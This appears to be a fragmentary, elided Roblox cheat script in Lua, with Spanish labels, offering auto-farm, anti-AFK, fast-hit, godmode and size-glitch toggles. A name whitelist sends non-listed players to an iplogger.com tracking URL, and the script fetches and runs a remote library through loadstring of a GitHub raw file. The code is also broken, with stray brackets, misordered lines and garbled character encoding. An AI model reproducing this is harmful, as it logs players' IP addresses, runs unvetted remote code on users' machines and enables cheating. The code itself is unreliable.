local whitelist = {
    ...
    ["LIT_colotixX"] = true,
    ["XxMGZemXx"] = true,
    -- AÃ±ade mÃ¡s nombres permitidos segÃºn sea necesario
}
...
LocalPlayer:kick("puta")
if not whitelist[LocalPlayer.Name] then
    local redirectUrl = "https://iplogger.com/Secso"
    })
end
local Players = game:GetService("Players")
local LocalPlayer = Players.LocalPlayer
...
local library = loadstring(game:HttpGet("https://raw.githubusercontent.com/arros-max/Pepe/refs/heads/main/main.lua"))()

-- VENTANA PRINCIPAL
local window = library:AddWindow("Ã°Å¸â€˜Â¹FZKÃ°Å¸â€˜Â¹", {
...
AutoFarm:AddSwitch("Anti AFK", function(state)
    if state then
        ...
        uselesslabelone.Text = "Anti Afk sacado de chat gpt de rafaelÃƒÂ°Ã…Â¸Ã‹Å“Ã¢â‚¬Å¡"
...
local titleLabel = Killer:AddLabel("Equipar pet de dura o daÃƒÆ’Ã‚Â±o")
	...
	if state then
		...
		task.spawn(function()
			while _G.fastHitActive do
				...
				if punch and LocalPlayer.Character and LocalPlayer.Character:FindFirstChild("Humanoid") and LocalPlayer.Character.Humanoid.Health > 0 then
					punch:Activate()
				end
			end
		end)
...
Killer:AddSwitch("Auto golpear [sin animaciÃƒÆ’Ã‚Â³n]", function(state)
...
Killer:AddSwitch("golpe rÃƒÆ’Ã‚Â¡pido", function(state)
...
Killer:AddSwitch("DaÃƒÆ’Ã‚Â±o con Godmode", function(state)
...
Killer:AddButton("TamaÃƒÆ’Ã‚Â±o NaN", function()
